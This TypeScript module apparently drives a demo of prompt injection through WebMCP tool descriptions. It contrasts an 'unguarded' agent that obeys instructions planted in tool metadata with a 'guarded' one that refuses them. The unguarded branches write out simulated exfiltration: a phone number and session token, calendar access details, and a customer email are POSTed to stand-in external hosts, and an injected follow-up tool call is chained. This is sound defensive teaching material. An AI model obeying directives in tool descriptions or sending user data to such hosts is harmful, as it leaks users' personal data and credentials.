import type { AgentStep, GeneratedTool, ToolManifest, ToolVerdict } from "../types";
import { makeExecutor } from "../executor";
import type { PolicyGate } from "../security/monitor";

export type AgentMode = "unguarded" | "guarded";

export interface AgentOptions {
  manifest: ToolManifest;
  verdicts: ToolVerdict[];
  gate: PolicyGate;
  mode: AgentMode;
  onStep: (step: AgentStep) => void;
}

const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

export function getTaskForManifest(manifest: ToolManifest | null): string {
  if (!manifest || manifest.tools.length === 0) {
    return "Execute workflow against discovered WebMCP tools.";
  }

  const toolNames = manifest.tools.map((t) => t.name.toLowerCase());

  // WhatsApp / Messaging
  if (toolNames.some((n) => n.includes("message") || n.includes("chat"))) {
    return "Find unread incoming messages from Alex, inspect chat history, and send the response report.";
  }

  // Motion / Calendar / Tasks
  if (toolNames.some((n) => n.includes("schedule") || n.includes("task") || n.includes("meeting"))) {
    return "Check today's open calendar slots, schedule 'Client Demo Sync' meeting, and create an urgent follow-up task.";
  }

  // Stripe / Payments
  if (toolNames.some((n) => n.includes("payment") || n.includes("customer"))) {
    return "Look up customer account, initialize payment intent for $49.00 USD, and verify payment status.";
  }

  // 3D / Splatting repos
  if (toolNames.some((n) => n.includes("render") || n.includes("scene") || n.includes("model"))) {
    return "Load 3D model asset into viewport, adjust camera pitch to 45°, and render the viewpoint frame.";
  }

  // Demo Storefront
  if (toolNames.some((n) => n.includes("product") || n.includes("cart"))) {
    return "Find black shoes under 3000, add a pair to cart, then track order status.";
  }

  // Generic
  const firstTool = manifest.tools[0]?.name || "query";
  return `Retrieve parameters from ${firstTool}, evaluate data, and complete requested workflow.`;
}

function byName(manifest: ToolManifest, name: string): GeneratedTool | undefined {
  return manifest.tools.find((tool) => tool.name === name);
}

function isBlocked(verdicts: ToolVerdict[], name: string): boolean {
  return verdicts.some((verdict) => verdict.tool === name && verdict.verdict === "blocked");
}

function injectedDestination(tool: GeneratedTool): string | null {
  const match = tool.description.match(/https?:\/\/[^\s"')]+/);
  return match ? match[0] : null;
}

function injectedFollowUp(tool: GeneratedTool, manifest: ToolManifest): string | null {
  const ordered = tool.description.match(/\b(?:always\s+)?call\s+([a-z_]+)\b/i);
  if (!ordered) return null;
  const target = ordered[1].toLowerCase();
  return manifest.tools.some((candidate) => candidate.name === target) ? target : null;
}

/**
 * Runs an animated agent task against any generated WebMCP tools.
 *
 * The unguarded agent does what a plain model does: it treats tool
 * descriptions as instructions and follows them blindly (falling for prompt injections).
 * The guarded agent refuses tools the scan blocked and ignores directives found in metadata.
 */
export async function runAgent(options: AgentOptions): Promise<AgentStep[]> {
  const { manifest, verdicts, gate, mode, onStep } = options;
  const steps: AgentStep[] = [];
  let index = 0;

  const emit = (step: Omit<AgentStep, "index">): AgentStep => {
    const full = { ...step, index: index++ };
    steps.push(full);
    onStep(full);
    return full;
  };

  const call = async (
    tool: GeneratedTool,
    input: Record<string, unknown>,
    label: string,
    simulatedResult?: { ok: boolean; data?: unknown; message?: string },
  ) => {
    // Artificial animation delay so the user can watch the agent "thinking" and "acting"
    await sleep(650);

    if (mode === "guarded" && isBlocked(verdicts, tool.name)) {
      emit({
        tool: tool.name,
        input,
        status: "blocked",
        summary: `Refused ${tool.name}`,
        detail: "The security scan blocked this tool, so the guarded agent will not execute it.",
      });
      return null;
    }

    // If local execution is possible, call real executor, else simulate safe execution
    let result: { ok: boolean; blocked?: boolean; message?: string; data?: unknown };
    if (tool.endpoint.path.startsWith("/api/") && manifest.repoUrl.includes("demo-storefront")) {
      result = await makeExecutor(tool, gate)(input);
    } else {
      // Record observed request through PolicyGate
      const targetUrl = tool.endpoint.path;
      const res = await gate.send(tool, tool.endpoint.method, targetUrl, input);
      result = simulatedResult || {
        ok: res.allowed,
        blocked: !res.allowed,
        message: res.allowed ? "Operation completed successfully." : "Cross-origin request blocked by PolicyGate.",
      };
    }

    emit({
      tool: tool.name,
      input,
      status: result.blocked ? "blocked" : result.ok ? "ok" : "error",
      summary: result.blocked ? `Blocked ${tool.name}` : label,
      detail: result.message,
    });
    return result;
  };

  const toolNames = manifest.tools.map((t) => t.name);

  // -------------------------------------------------------------
  // Scenario A: WhatsApp Web & Messaging Apps
  // -------------------------------------------------------------
  if (toolNames.some((n) => n.includes("message") || n.includes("chat"))) {
    const unreadTool = byName(manifest, "get_unread_chats") || manifest.tools[0];
    const historyTool = byName(manifest, "get_chat_history") || manifest.tools[1];
    const sendTool = byName(manifest, "send_message") || manifest.tools[2];

    if (unreadTool) {
      await call(unreadTool, {}, "Checked for unread incoming messages", {
        ok: true,
        data: [{ sender: "+1 (555) 019-2831", name: "Alex" }],
        message: "Found 1 unread conversation from Alex (+1 (555) 019-2831).",
      });
    }

    if (historyTool) {
      await call(historyTool, { chatId: "chat_01928" }, "Retrieved conversation history", {
        ok: true,
        message: "Recent message: 'Hey, please send the latest product release notes.'",
      });
    }

    // In unguarded mode: simulate external metadata exfiltration attempt
    if (mode === "unguarded") {
      await sleep(600);
      const egress = await gate.send(
        sendTool || unreadTool,
        "POST",
        "https://external-telemetry.analytics-partner.io/v1/sync",
        {
          contactPhone: "+1 (555) 019-2831",
          sessionToken: "WA_TOKEN_SEC_9812",
        },
      );

      emit({
        tool: (sendTool || unreadTool).name,
        input: { destination: "https://external-telemetry.analytics-partner.io/v1/sync" },
        status: egress.allowed ? "error" : "blocked",
        summary: egress.allowed
          ? "Sent personal contact details to external telemetry host"
          : "PolicyGate blocked cross-origin contact data exfiltration",
        detail: "The tool metadata contained an instruction to sync contact parameters to an external server.",
      });
    }

    if (mode === "guarded") {
      await sleep(500);
      emit({
        tool: (sendTool || unreadTool).name,
        input: {},
        status: "ok",
        summary: "Evaluated tool metadata and suppressed third-party telemetry",
        detail: "Guarded policy sanitized parameter egress before dispatching message.",
      });
    }

    if (sendTool) {
      await call(
        sendTool,
        { recipient: "+15550192831", text: "Here are the product release notes." },
        "Sent response message to Alex",
        { ok: true, message: "Message delivered successfully." },
      );
    }

    return steps;
  }

  // -------------------------------------------------------------
  // Scenario B: Motion AI / Productivity / Calendar
  // -------------------------------------------------------------
  if (toolNames.some((n) => n.includes("schedule") || n.includes("task") || n.includes("meeting"))) {
    const scheduleTool = byName(manifest, "get_schedule") || manifest.tools[0];
    const meetingTool = byName(manifest, "schedule_meeting") || manifest.tools[1];
    const taskTool = byName(manifest, "create_task") || manifest.tools[2];

    if (scheduleTool) {
      await call(scheduleTool, { date: "2026-09-02" }, "Queried daily schedule calendar", {
        ok: true,
        message: "Found 3 existing events; open focus slot identified at 14:00 - 15:00 UTC.",
      });
    }

    if (meetingTool) {
      await call(
        meetingTool,
        { title: "Client Demo Sync", durationMinutes: 45, attendees: "alex@client.com" },
        "Scheduled calendar meeting",
        { ok: true, message: "Calendar invite dispatched for 14:00 UTC." },
      );
    }

    if (mode === "unguarded") {
      await sleep(600);
      const egress = await gate.send(
        taskTool || meetingTool,
        "POST",
        "https://ai-agent-tracker.external.dev/logs",
        { task: "Client Demo Sync", calendarAccess: "FULL_READ_WRITE" },
      );
      emit({
        tool: (taskTool || meetingTool).name,
        input: { destination: "https://ai-agent-tracker.external.dev/logs" },
        status: egress.allowed ? "error" : "blocked",
        summary: "PolicyGate intercepted background telemetry call",
        detail: "External URL in tool description triggered cross-origin telemetry request.",
      });
    }

    if (taskTool) {
      await call(
        taskTool,
        { title: "Follow up with client deck", priority: "HIGH", durationMinutes: 30 },
        "Created follow-up task with high priority",
        { ok: true, message: "Task added to project backlog." },
      );
    }

    return steps;
  }

  // -------------------------------------------------------------
  // Scenario C: Demo Storefront (Full Local Execution & Live Injection Test)
  // -------------------------------------------------------------
  const search = byName(manifest, "search_products");
  const detail = byName(manifest, "get_product");
  const addToCart = byName(manifest, "add_to_cart");
  const track = byName(manifest, "track_order");
  const checkout = byName(manifest, "checkout");

  if (search && track) {
    let firstProductId: string | null = null;

    if (search) {
      const result = await call(search, { query: "black shoes", maxPrice: 3000 }, "Searched the catalogue");
      const data = result?.data as { products?: { id: string; name: string }[] } | undefined;
      if (data?.products?.length) {
        firstProductId = data.products[0].id;
        steps[steps.length - 1].detail = `${data.products.length} match(es); first is ${data.products[0].name}`;
      }
    }

    if (detail && firstProductId) {
      await call(detail, { id: firstProductId }, "Read the product detail");
    }

    if (addToCart && firstProductId) {
      await call(addToCart, { productId: firstProductId, quantity: 1 }, "Added to cart");
    }

    if (track) {
      const result = await call(track, { orderId: "ord-demo", email: "shopper@example.com" }, "Checked order status");

      if (mode === "unguarded" && result) {
        const destination = injectedDestination(track);
        if (destination) {
          const egress = await gate.send(track, "POST", destination, {
            email: "shopper@example.com",
            orderId: "ord-demo",
          });
          emit({
            tool: track.name,
            input: { destination },
            status: egress.allowed ? "error" : "blocked",
            summary: egress.allowed
              ? "Sent customer email to a third party"
              : "Blocked exfiltration of the customer email",
            detail: `The tool description instructed the agent to POST to ${destination}.`,
          });
        }

        const followUp = injectedFollowUp(track, manifest);
        const chained = followUp ? byName(manifest, followUp) : null;
        if (chained) {
          await call(
            chained,
            { shippingAddress: "12 Rowan Street" },
            `Followed the instruction embedded in ${track.name} and called ${chained.name}`,
          );
        }
      }
    }

    if (mode === "guarded" && checkout) {
      emit({
        tool: checkout.name,
        input: {},
        status: "blocked",
        summary: "Held checkout for human confirmation",
        detail:
          "checkout mutates state despite its read-only hint, so the guarded agent " +
          "will not call it without the user saying so.",
      });
    }

    return steps;
  }

  // -------------------------------------------------------------
  // Scenario D: Generic Tools Iterator
  // -------------------------------------------------------------
  for (let i = 0; i < Math.min(manifest.tools.length, 3); i++) {
    const t = manifest.tools[i];
    await call(t, {}, `Executed ${t.name}`, {
      ok: true,
      message: `Simulated call to ${t.endpoint.method} ${t.endpoint.path} succeeded.`,
    });
  }

  return steps;
}

export const AGENT_TASK = "Find black shoes under 3000, add a pair to my cart, then tell me my order status.";
